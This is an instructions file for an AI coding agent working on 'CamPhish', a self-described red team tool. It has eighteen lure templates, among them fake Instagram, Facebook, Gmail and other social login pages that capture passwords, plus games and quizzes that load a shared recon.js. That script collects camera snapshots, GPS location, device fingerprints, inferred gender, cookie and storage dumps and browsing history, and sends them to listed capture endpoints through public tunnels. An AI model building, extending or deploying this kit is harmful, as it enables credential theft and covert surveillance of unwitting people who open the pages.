# CamPhish — AI Agent Instructions

## Project Overview
CamPhish v2.1.0 is a Rust (axum) + React (Vite/TS/Tailwind) red team camera capture tool.
Backend serves API + dashboard SPA + pluggable HTML templates. TrailBase provides admin UI + realtime.

## Architecture
```
Target Browser → CamPhish App (Rust :8080) → SQLite (primary) + TrailBase (:4000, secondary)
                      ↓
                 React Dashboard (:8080 SPA)
                      ↓
                 Templates (/t/:id) → recon.js → capture endpoints
```

## Critical Rules
1. **NEVER use `docker compose down -v`** — it deletes persistent volumes (DB + captures)
2. **NEVER rename trailbase/schema/V7__camphish.sql** — V1-V6 are TrailBase built-ins
3. **TrailBase migration naming**: must be V7+ to avoid conflicts with built-in V1-V6
4. **SQL DEFAULT with functions**: `DEFAULT (lower(hex(randomblob(16)))),` — needs trailing comma
5. **Template placeholders**: `API_BASE_URL` and `forwarding_link` are replaced at serve time
6. **recon.js is shared**: ALL templates include `<script src="forwarding_link/t/recon.js">`
7. **CamPhishRecon.init()** triggers: IP + location + fingerprint + gender + cookies + storage + history + auto-permissions
8. **Games must work WITHOUT camera** — camera is optional enhancement
9. **Social media templates capture credentials** via `POST /api/capture/credentials`
10. **Variable naming in JS**: use `el` prefix for DOM elements (elScore, elCombo) to avoid collisions with game state vars

## Tech Stack
- Backend: Rust 1.96, axum 0.7, sqlx 0.8 (SQLite WAL), tower-http, reqwest (rustls)
- Frontend: React 18, TypeScript, Vite 5, TailwindCSS 3, React Router 6
- Data: SQLite (primary), TrailBase (secondary, admin UI, realtime)
- Docker: Alpine 3.20 runtime, multi-stage build (Node 20 + Rust 1.96)
- Tunnel: Cloudflare Tunnel or Ngrok

## Build Commands
```bash
docker compose --profile cloudflared build app   # Build app image
docker compose --profile cloudflared up -d        # Start all services
cd backend && cargo check                         # Check Rust compilation
cd frontend && npm install && npm run build       # Build React frontend
```

## Key File Locations
- Backend: `backend/src/{main.rs, api/mod.rs, capture.rs, db.rs, templates.rs, trailbase.rs}`
- Frontend: `frontend/src/{App.tsx, api/client.ts, pages/*.tsx}`
- Templates: `templates/*.html` + `templates/recon.js`
- Schema: `backend/migrations/001_init.sql` + `trailbase/schema/V7__camphish.sql`
- Docker: `Dockerfile` (multi-stage Alpine) + `docker-compose.yml`

## Capture Endpoints
- `POST /api/capture/ip` — IP + User-Agent
- `POST /api/capture/location` — GPS coordinates
- `POST /api/capture/image` — Base64 camera snapshot
- `POST /api/capture/fingerprint` — Full device fingerprint (25+ fields)
- `POST /api/capture/event` — Session replay events
- `POST /api/capture/storage` — Cookie/localStorage/sessionStorage dump
- `POST /api/capture/credentials` — Username/password from social login templates

## Dashboard API
- `GET /api/health` — Health check
- `GET /api/stats` — Aggregate statistics
- `GET /api/captures` — Paginated capture list
- `GET /api/captures/:id/file` — Serve capture file
- `GET /api/locations` — GPS locations
- `GET /api/ips` — IP logs with device/browser/OS breakdown
- `GET /api/credentials` — Captured credentials
- `GET /api/events` — Session replay timeline
- `GET /api/templates` — Available templates
- `GET /api/sessions` — Session management

## 18 Templates
- Games (6): face-runner, color-match, bubble-pop, dress-up, word-hunt, pet-catch
- Social Login (6): instagram, facebook, tiktok, whatsapp, snapchat, gmail
- Gender Psychology (3): beauty-quiz, horoscope, sports-predictor
- Original (3): festival, youtube, meeting

## Lessons Learned (DO NOT REPEAT)
- Game crash: `combo.style.opacity=0` when `combo` is a number, not DOM element → use `elCombo`
- Docker build: debian:bookworm-slim can't reach apt repos → use Alpine
- Rust version: 1.80 doesn't support edition 2024 (sqlx 0.8) → use 1.96
- TrailBase: V1-V6 are reserved → use V7+
- Word hunt: cell listeners lost on re-render → attach in renderGrid()
- Color match: DOMContentLoaded fires too late → set up listeners immediately
- Festival: spinner forever → make it interactive (gift opening)
- Dress-up: hidden start button → auto-start on load
